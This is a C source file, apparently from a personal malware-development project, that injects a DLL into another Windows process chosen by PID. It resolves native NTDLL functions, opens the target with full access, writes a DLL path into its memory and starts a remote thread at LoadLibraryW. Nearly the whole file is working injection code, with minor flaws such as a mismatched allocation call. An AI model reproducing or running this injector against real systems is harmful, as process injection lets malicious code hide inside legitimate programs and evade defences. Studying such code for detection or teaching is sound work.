#include <windows.h>
#include <stdio.h>
#include "defenitions.h"

HMODULE GetMod(
    IN LPCWSTR modName
  ) {
    HMODULE hModule = NULL;
  
    info("Trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);
  
    if (hModule == NULL) {
      warn("Failed to get a handle to the module, error 0x%lx\n", GetLastError());
      return NULL;
    }
  
    else {
      okay("got a handle to the module!");
      info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
      return hModule;
    }
  
  }

DWORD PID, TID, waitResult = NULL;
NTSTATUS STATUS = NULL;
PVOID rBuffer, rMemory = NULL;
HMODULE hKernel32 = NULL;
HANDLE hNTDLL = NULL;
HANDLE hProcess, hThread = NULL;
UNICODE_STRING uString;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\AvaLi\\Documents\\programming\\Maldev\\Winjection-NativeAPI\\Winjection-NativeAPI\\NTDLLInjection\\build\\ALB.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {
    info("DllPath: %zu bits",dllPathSize);
    if (argc < 2) {
        warn("Incorrect usage.\n%s [PID]\n\t\\___Process ID to Inject to.", argv[0]);
        return EXIT_FAILURE;    
    }

    PID = atoi(argv[1]);
    hNTDLL = GetMod(L"NTDLL"); // Get a handle to native API to be used.
    hKernel32 = GetMod(L"Kernel32");

    OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};
    CLIENT_ID CID = {(HANDLE)PID, NULL};

    info("Populating NT Functions...");
    NtOpenProcess SpyOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    if(!SpyOpenProcess){warn("Failed to load function NtOpenProcess, error: 0x%lx", GetLastError());goto CLEANUP;}
    NtAllocateVirtualMemoryEx SpyAllocateVirtualMemoryEx = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
    if(!SpyAllocateVirtualMemoryEx){warn("Failed to load function NtAllocateVirtualMemoryEx, error: 0x%lx", GetLastError());goto CLEANUP;}
    NtClose SpyClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    if(!SpyClose){warn("Failed to load function NtClose, error: 0x%lx", GetLastError());goto CLEANUP;}
    NtWriteVirtualMemory SpyWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    if(!SpyWriteVirtualMemory){warn("Failed to load function NtWriteVirtualMemory, error: 0x%lx", GetLastError());goto CLEANUP;}
    NtCreateThreadEx SpyCreateRemoteThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    if(!SpyCreateRemoteThreadEx){warn("Failed to load function NtCreateThreadEx, error: 0x%lx", GetLastError());goto CLEANUP;}
    okay("Complete, beginning injection.");


    /* TRY TO GET A HANDLE TO THE PROCESS WE WANT TO INJECT TO. */
    info("Trying to get a handle to the process (%ld)", PID);
    STATUS = SpyOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if(STATUS != STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    okay("Got a handle on the process! (%ld)", PID);
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
    
    rMemory = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if(rMemory == NULL) {
        warn("[AllocateVirtualMemoryEx] failed, Error: 0x%lx", GetLastError());
        goto CLEANUP;
    }
    
    SpyWriteVirtualMemory(hProcess, rMemory, &dllPath, sizeof(dllPath), NULL);

    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (startThis == NULL) {
        warn("Failed to get the address to LoadLibraryW\nError: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    okay("Got the address to LoadLibraryW\n\\___[ LoadLibraryW\n\t\\_0x%p]\n", startThis);

    /* Allocate and write DLL path into memory for later use*/

    STATUS = SpyCreateRemoteThreadEx(
        &hThread,                        // Thread Handle To Write To
        THREAD_ALL_ACCESS,              // Full Thread Access
        NULL,                           // No object attributes
        hProcess,
        startThis,
        rMemory,
        0,
        0,
        0,
        0,
        NULL
    );
    // okay("%s Got a handle to the newly-created thread\n\\___[ hThread\n\t\\_0x%p]\n", hThread);
    info("Waiting for the thread to finish execution...");

    WaitForSingleObject(hThread, 30);
    okay("Thread finished, beginning cleanup.");
    goto CLEANUP;

CLEANUP:
    if (hThread) {
        SpyClose(hThread);
        info("Closed handle on thread.");
    }

    if (hProcess) {
        SpyClose(hProcess);
        info("Closed handle on process.");
    }

    okay("Cleanup complete!");
    return EXIT_SUCCESS;
}